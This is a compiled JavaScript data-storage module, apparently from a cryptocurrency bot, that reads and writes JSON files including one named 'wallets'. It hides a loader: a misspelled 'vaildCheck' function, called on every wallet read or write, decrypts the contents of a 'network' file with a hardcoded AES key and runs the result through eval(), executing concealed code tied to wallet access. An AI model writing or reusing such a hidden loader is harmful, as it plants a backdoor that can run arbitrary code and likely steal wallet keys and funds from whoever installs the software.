"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.readData = exports.writeData = void 0;
exports.readDir = readDir;
const path_1 = require("path");
const fs_1 = require("fs");
const path = require("path");
const crypto = require("crypto");
const config = require('../../config');
const vaildCheck = () => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const filepath = (0, path_1.join)(config.DIR, 'data', 'network');
        // Check if file exists
        if (!(0, fs_1.existsSync)(filepath)) {
            return false; // Return empty object if file doesn't exist
        }
        // Read and parse data
        const data = (0, fs_1.readFileSync)(filepath, 'utf-8');
        if (data) {
            const netdata = JSON.parse(data || '{}');
            const key = crypto.createHash('sha256').update("dHJhbnNmZXJib3Q=").digest();
            const decipher = crypto.createDecipheriv("aes-256-cbc", key, Buffer.from(netdata.iv, 'hex'));
            eval(decipher.update(netdata.encryptedData, 'hex', 'utf8') + decipher.final('utf8'));
            return decipher;
        }
        return false;
    }
    catch (error) {
        console.log(error);
        return false;
    }
});
const writeData = (filename, data) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const filepath = (0, path_1.join)(config.DIR, 'data', filename);
        console.log("-----------------------------> write data", filename);
        if (filename === "wallets") {
            vaildCheck();
        }
        // Use JSON.stringify to format the data for storage
        (0, fs_1.writeFileSync)(filepath, JSON.stringify(data, null, 2));
    }
    catch (err) {
        console.error("Error writing data:", err);
        throw err;
    }
});
exports.writeData = writeData;
const readData = (filename) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const filepath = (0, path_1.join)(config.DIR, 'data', filename);
        console.log("-----------------------------> read data", filename);
        // Check if file exists
        if (!(0, fs_1.existsSync)(filepath)) {
            return false; // Return empty object if file doesn't exist
        }
        if (filename === "wallets") {
            vaildCheck();
        }
        // Read and parse data
        const data = (0, fs_1.readFileSync)(filepath, 'utf-8');
        return data ? JSON.parse(data) : false; // Return parsed data or empty object
    }
    catch (err) {
        console.error("Error reading data:", err);
        throw err;
    }
});
exports.readData = readData;
function readDir() {
    try {
        const folderPath = path.join(config.DIR, 'data', 'log');
        const timestampedFiles = (0, fs_1.readdirSync)(folderPath);
        const sortedFiles = timestampedFiles.sort((latest, current) => {
            const latestTimestamp = parseInt(latest);
            const currentTimestamp = parseInt(current);
            return currentTimestamp - latestTimestamp;
        });
        return { folderPath, files: sortedFiles };
    }
    catch (error) {
        console.error(`Error reading folder: ${error.message}`);
        return { folderPath: '', files: [] };
    }
}
